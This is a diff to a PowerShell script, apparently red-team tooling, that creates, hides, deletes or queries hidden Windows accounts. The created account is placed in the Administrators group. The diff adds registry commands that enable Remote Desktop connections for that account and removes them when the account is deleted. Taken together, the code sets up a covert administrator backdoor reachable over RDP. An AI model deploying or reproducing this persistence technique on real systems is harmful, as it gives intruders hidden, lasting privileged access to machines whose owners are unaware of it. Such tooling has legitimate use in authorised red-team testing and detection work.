@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: administrator privileges
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.2
+   PS cmdlet Dev version: v1.0.3
 
 .DESCRIPTION
    This CmdLet Querys, Creates or Deletes windows hidden accounts.
@@ -15,7 +15,8 @@
 .NOTES
    Required Dependencies: Administrator Privileges on shell
    Mandatory to {Create|Delete} or set the account {Visible|Hidden} state
-   The new created user account will be added to 'administrators' Group Name.
+   The new created user account will be added to 'administrators' Group Name
+   And desktop will allow multiple RDP connections { AllowTSConnections }
 
 .Parameter Action
    Accepts arguments: Query, Create, Delete, Visible, Hidden
@@ -144,6 +145,7 @@ If($Action -ieq "Query"){
    .NOTES
       Required Dependencies: Administrator Privileges on shell
       This function add's created account to Administrators Group
+      And desktop will allow multiple RDP connections { AllowTSConnections } 
 
    .EXAMPLE
       PS C:\> .\HiddenUser.ps1 -Action Create -UserName "SSAredTeam"
@@ -205,7 +207,7 @@ If($Action -ieq "Query"){
    If($AdminGroupName){## Admin Group Name found!
    
       Add-LocalGroupMember -Group "$AdminGroupName" -Member "$UserName"
-      If(-not($LASTEXITCODE -eq 0)){## Failed to add created account to 'administrators' Group
+      If(-not($? -eq $True)){## Failed to add created account to 'administrators' Group
 
          Write-Host "`n`n[error] fail to add '$UserName' account to '$AdminGroupName' Group!`n`n" -ForegroundColor Red -BackgroundColor Black
 
@@ -216,6 +218,10 @@ If($Action -ieq "Query"){
       Write-Host "`n`n[error] fail to add '$UserName' account to 'Administrators' Group!`n`n" -ForegroundColor Red -BackgroundColor Black
 
    }
+
+   ## Allow RDP multiple connections
+   reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f|Out-Null
+   reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f|Out-Null
 
    ## De-Activate account { hidden }
    net user $UserName /active:no|Out-Null
@@ -281,6 +287,12 @@ If($Action -ieq "Query"){
    
       Remove-LocalUser -Name "$UserName"|Out-Null
       ## [cmd] net user $UserName /DELETE|Out-Null
+
+      ## Delete RDP user access
+      reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f|Out-Null
+      reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f|Out-Null
+
+      ## Build Output Table
       Get-LocalUser * | Select-Object Enabled,Name,LastLogon,PasswordLastSet,PasswordRequired | Format-Table
          
    }Else{## Account Name NOT found
